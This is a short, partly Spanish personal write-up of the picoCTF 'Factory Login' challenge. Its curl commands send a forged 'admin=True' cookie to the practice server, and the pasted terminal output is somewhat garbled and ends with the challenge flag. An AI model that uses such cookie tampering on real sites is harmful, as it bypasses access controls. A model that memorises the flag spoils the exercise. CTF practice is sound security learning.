Description The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? [https://jupiter.challenges.picoctf.org/problem/13594/](https://jupiter.challenges.picoctf.org/problem/13594/) (link) or [http://jupiter.challenges.picoctf.org:13594](http://jupiter.challenges.picoctf.org:13594/)


![[Pasted image 20250324122614.png]]

se le da inspeccionar 

curl https://jupiter.challenges.picoctf.org/problem/13594/flag

curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: username=yoli; password=yoli; admin===True" | grep pico==
## Solución:
```
yoli@Yoli:~$ curl https://jupiter.challenges.picoctf.org/problem/13594/flag
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
yoli@Yoli:~$ curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: username=yoli; passworyoli@Yoli:~$ curl https://jupiter.yoli@Yoli:~$ curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: username=yoli; password=yoli;  username=yoli; admin=True
> curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: username=yoli; password=yoli; admin=True"
>
> curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: username=yoli; password=yoli;  username=yoli; admin=True
curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: username=yoli; password=yoli; admin=True" | grep pico
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
</body>

</html>curl: (6) Could not resolve host: username=yoli
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   3023      0 --:--:-- --:--:-- --:--:--  3016
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</code></p>


picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}
```